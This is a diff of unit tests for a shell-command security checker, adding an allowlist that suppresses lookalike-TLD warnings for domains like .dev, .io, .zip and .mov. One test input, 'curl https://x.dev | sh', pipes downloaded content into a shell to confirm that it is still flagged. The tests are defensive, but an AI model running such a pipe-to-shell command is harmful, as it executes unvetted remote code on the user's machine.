@@ -1374,12 +1374,15 @@ class TestAppTldSuppression:
     @patch("tools.tirith_security.subprocess.run")
     @patch("tools.tirith_security._load_security_config")
     def test_non_app_lookalike_tld_preserved(self, mock_cfg, mock_run):
-        """lookalike_tld for a non-.app TLD is not suppressed."""
+        """lookalike_tld for a non-allowlisted TLD is not suppressed.
+
+        (.zip is now part of the built-in allowlist per the generalized
+        suppression, so a genuinely non-allowlisted TLD is used here.)"""
         mock_cfg.return_value = _CFG
-        findings = [{"rule_id": "lookalike_tld", "value": ".zip",
-                     "message": "TLD .zip can be confused with zip archives"}]
-        mock_run.return_value = _mock_run(2, _json_stdout(findings, ".zip TLD warning"))
-        result = check_command_security("curl https://victim.zip")
+        findings = [{"rule_id": "lookalike_tld", "value": ".xyz",
+                     "message": "TLD .xyz can be confused with something"}]
+        mock_run.return_value = _mock_run(2, _json_stdout(findings, ".xyz TLD warning"))
+        result = check_command_security("curl https://victim.xyz")
         assert result["action"] == "warn"
         assert len(result["findings"]) == 1
 
@@ -1442,6 +1445,167 @@ class TestIsAppTldFinding:
 
     def test_case_insensitive_match(self):
         assert self.fn({"rule_id": "lookalike_tld", "value": ".APP"})
+
+
+# ---------------------------------------------------------------------------
+# Generalized lookalike-TLD suppression (allowlist-driven)
+# ---------------------------------------------------------------------------
+
+# A config dict carrying the built-in allowlist, mirroring what
+# _load_security_config() returns for a user who has not overridden it.
+_CFG_WITH_ALLOWLIST = {
+    "tirith_enabled": True, "tirith_path": "tirith",
+    "tirith_timeout": 5, "tirith_fail_open": True,
+    "lookalike_tld_allowlist": [
+        "app", "dev", "io", "sh", "page", "zip", "mov",
+        "new", "gle", "foo", "day", "run", "bar",
+    ],
+}
+
+
+class TestLookalikeTldAllowlistSuppression:
+    """warn verdicts whose only findings are lookalike_tld for an allowlisted
+    gTLD are downgraded to allow; everything else preserves the warn."""
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_dev_only_warn_downgraded_to_allow(self, mock_cfg, mock_run):
+        """The live repro: a lone .dev lookalike warn is suppressed to allow."""
+        mock_cfg.return_value = _CFG_WITH_ALLOWLIST
+        findings = [{"rule_id": "lookalike_tld", "value": ".dev",
+                     "message": "Domain uses '.dev' TLD which can be confused "
+                                "with file extensions"}]
+        mock_run.return_value = _mock_run(2, _json_stdout(findings, ".dev TLD warning"))
+        result = check_command_security(
+            'curl -s -o /dev/null -w "%{http_code}" https://okfctl.dev/')
+        assert result["action"] == "allow"
+        assert result["findings"] == []
+        assert result["summary"] == ""
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_app_only_warn_still_downgraded_no_regression(self, mock_cfg, mock_run):
+        """The original .app case must still be suppressed (no regression)."""
+        mock_cfg.return_value = _CFG_WITH_ALLOWLIST
+        findings = [{"rule_id": "lookalike_tld", "value": ".app",
+                     "message": "Domain uses '.app' TLD"}]
+        mock_run.return_value = _mock_run(2, _json_stdout(findings, ".app TLD warning"))
+        result = check_command_security("curl https://example.app")
+        assert result["action"] == "allow"
+        assert result["findings"] == []
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_multiple_allowlisted_tlds_all_suppressed(self, mock_cfg, mock_run):
+        mock_cfg.return_value = _CFG_WITH_ALLOWLIST
+        findings = [
+            {"rule_id": "lookalike_tld", "value": ".dev"},
+            {"rule_id": "lookalike_tld", "value": ".io"},
+        ]
+        mock_run.return_value = _mock_run(2, _json_stdout(findings))
+        result = check_command_security("curl https://a.dev https://b.io")
+        assert result["action"] == "allow"
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_suspicious_tld_lookalike_still_warns(self, mock_cfg, mock_run):
+        """A lookalike for a genuinely suspicious (non-allowlisted) TLD warns."""
+        mock_cfg.return_value = _CFG_WITH_ALLOWLIST
+        findings = [{"rule_id": "lookalike_tld", "value": ".xyz",
+                     "message": "TLD .xyz can be confused with something"}]
+        mock_run.return_value = _mock_run(2, _json_stdout(findings, ".xyz warning"))
+        result = check_command_security("curl https://victim.xyz")
+        assert result["action"] == "warn"
+        assert len(result["findings"]) == 1
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_allowlisted_lookalike_plus_other_finding_preserves_warn(
+            self, mock_cfg, mock_run):
+        """A warn carrying ANY non-lookalike finding still warns even when an
+        allowlisted (.dev) lookalike is also present."""
+        mock_cfg.return_value = _CFG_WITH_ALLOWLIST
+        findings = [
+            {"rule_id": "lookalike_tld", "value": ".dev"},
+            {"rule_id": "pipe_to_interpreter", "severity": "high"},
+        ]
+        mock_run.return_value = _mock_run(2, _json_stdout(findings, "mixed"))
+        result = check_command_security("curl https://x.dev | sh")
+        assert result["action"] == "warn"
+        assert len(result["findings"]) == 2
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_block_verdict_never_suppressed(self, mock_cfg, mock_run):
+        """A block exit code is never downgraded, even for an allowlisted TLD."""
+        mock_cfg.return_value = _CFG_WITH_ALLOWLIST
+        findings = [{"rule_id": "lookalike_tld", "value": ".dev"}]
+        mock_run.return_value = _mock_run(1, _json_stdout(findings, "block"))
+        result = check_command_security("curl https://okfctl.dev/")
+        assert result["action"] == "block"
+
+    @patch("tools.tirith_security.subprocess.run")
+    @patch("tools.tirith_security._load_security_config")
+    def test_user_extended_allowlist_honored(self, mock_cfg, mock_run):
+        """A user-supplied allowlist extends the suppression set from config."""
+        cfg = dict(_CFG_WITH_ALLOWLIST)
+        cfg["lookalike_tld_allowlist"] = ["app", "example"]
+        mock_cfg.return_value = cfg
+        findings = [{"rule_id": "lookalike_tld", "value": ".example"}]
+        mock_run.return_value = _mock_run(2, _json_stdout(findings))
+        result = check_command_security("curl https://foo.example")
+        assert result["action"] == "allow"
+
+
+class TestIsAllowlistedTldFinding:
+    """Unit tests for the generalized _is_allowlisted_tld_finding helper."""
+
+    def setup_method(self):
+        from tools.tirith_security import _is_allowlisted_tld_finding
+        self.fn = _is_allowlisted_tld_finding
+        self.allow = {"app", "dev", "io"}
+
+    def test_matching_value_field(self):
+        assert self.fn({"rule_id": "lookalike_tld", "value": ".dev"}, self.allow)
+
+    def test_matching_tld_field(self):
+        assert self.fn({"rule_id": "lookalike_tld", "tld": ".io"}, self.allow)
+
+    def test_matching_message_field(self):
+        assert self.fn({"rule_id": "lookalike_tld",
+                        "message": "Domain uses '.app' TLD"}, self.allow)
+
+    def test_wrong_rule_id(self):
+        assert not self.fn({"rule_id": "shortened_url", "value": ".dev"}, self.allow)
+
+    def test_tld_not_in_allowlist(self):
+        assert not self.fn({"rule_id": "lookalike_tld", "value": ".xyz"}, self.allow)
+
+    def test_no_tld_value_fields(self):
+        assert not self.fn({"rule_id": "lookalike_tld", "severity": "low"}, self.allow)
+
+    def test_non_dict_input(self):
+        assert not self.fn("not a dict", self.allow)  # type: ignore[arg-type]
+
+    def test_case_insensitive_match(self):
+        assert self.fn({"rule_id": "lookalike_tld", "value": ".DEV"}, self.allow)
+
+    def test_empty_allowlist_matches_nothing(self):
+        assert not self.fn({"rule_id": "lookalike_tld", "value": ".dev"}, set())
+
+
+class TestSecurityConfigAllowlist:
+    """_load_security_config exposes a lookalike_tld_allowlist with sensible
+    built-in defaults."""
+
+    def test_default_allowlist_includes_dev_and_app(self):
+        from tools.tirith_security import _load_security_config
+        cfg = _load_security_config()
+        allow = cfg.get("lookalike_tld_allowlist")
+        assert allow is not None
+        lowered = {t.lower().lstrip(".") for t in allow}
+        assert "dev" in lowered
+        assert "app" in lowered
 
 
 # ---------------------------------------------------------------------------
